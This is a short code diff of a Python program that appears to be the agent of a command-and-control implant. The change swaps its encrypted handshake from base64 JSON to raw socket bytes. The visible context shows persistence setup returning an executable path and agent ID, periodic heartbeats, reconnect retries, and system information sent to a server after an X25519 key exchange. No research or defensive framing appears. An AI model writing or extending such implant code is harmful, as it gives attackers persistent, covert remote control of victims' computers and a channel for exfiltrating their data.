@@ -1,7 +1,6 @@
 import os
 import socket
 import time
-import base64
 from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from cryptography.hazmat.primitives import hashes, serialization
@@ -16,6 +15,7 @@ SERVER_PORT = 8080
 SEND_HEARTBEAT_INTERVAL = 180
 RETRY_CONNECT_INTERVAL = 10
 EXE_LOCATION, AGENT_ID_LOCATION = setup_persistence()  # Setup persistence and return exe and agent ID locations.
+KEY_LENGTH = 32
 
 
 def read_uuid() -> str | None:
@@ -36,18 +36,17 @@ def communicate(s: socket.socket, system_info: dict) -> None:
         # Send agent-public-key message.
         private_key = X25519PrivateKey.generate()
         public_key = private_key.public_key().public_bytes(encoding=serialization.Encoding.Raw, format=serialization.PublicFormat.Raw)
-        send_json(s, {"agent-public-key": base64.b64encode(public_key).decode()})
+        s.send(public_key)
 
         # Receive server-public-key message.
-        server_public_key = base64.b64decode(receive_json(s).get("server-public-key"))
+        server_public_key = s.recv(KEY_LENGTH)
         shared_key = private_key.exchange(X25519PublicKey.from_public_bytes(server_public_key))
         derived_key = HKDF(
             algorithm=hashes.SHA256(),
-            length=32,
+            length=KEY_LENGTH,
             salt=None,
             info=b'handshake data',
         ).derive(shared_key)
-
 
         # Construct agent hello message
         agent_hello = system_info
